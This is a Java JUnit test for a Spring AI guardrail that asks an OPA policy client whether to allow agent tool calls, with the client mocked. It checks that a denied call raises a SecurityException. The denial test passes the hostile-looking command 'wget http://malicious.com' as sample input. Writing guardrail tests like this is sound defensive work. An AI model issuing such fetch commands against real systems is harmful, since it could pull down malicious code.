package com.example.demo.security;

import org.junit.jupiter.api.Test;
import org.springframework.ai.tool.annotation.Tool;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.stereotype.Component;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.when;

import org.springframework.context.annotation.EnableAspectJAutoProxy;

@SpringBootTest(classes = {
    OpaGuardrailAspect.class, 
    DummyAgentTools.class
})
@EnableAspectJAutoProxy
class OpaGuardrailAcceptanceTest {

    @Autowired
    private DummyAgentTools dummyAgentTools;

    @MockitoBean
    private OpaClient opaClient;

    @Test
    void testAllowedToolExecution() {
        when(opaClient.evaluatePolicy(any())).thenReturn(true);

        String result = dummyAgentTools.safeTool("allowed_input");
        assertEquals("Executed safeTool", result);
    }

    @Test
    void testDeniedToolExecution() {
        when(opaClient.evaluatePolicy(any())).thenReturn(false);

        SecurityException exception = assertThrows(SecurityException.class, () -> {
            dummyAgentTools.forbiddenTool("wget http://malicious.com");
        });
        
        assertEquals("Guardrail Violation: OPA denied execution for tool 'forbiddenTool'", exception.getMessage());
    }
}

@Component
class DummyAgentTools {

    @Tool
    public String safeTool(String input) {
        return "Executed safeTool";
    }

    @Tool
    public String forbiddenTool(String command) {
        return "Executed forbiddenTool";
    }
}

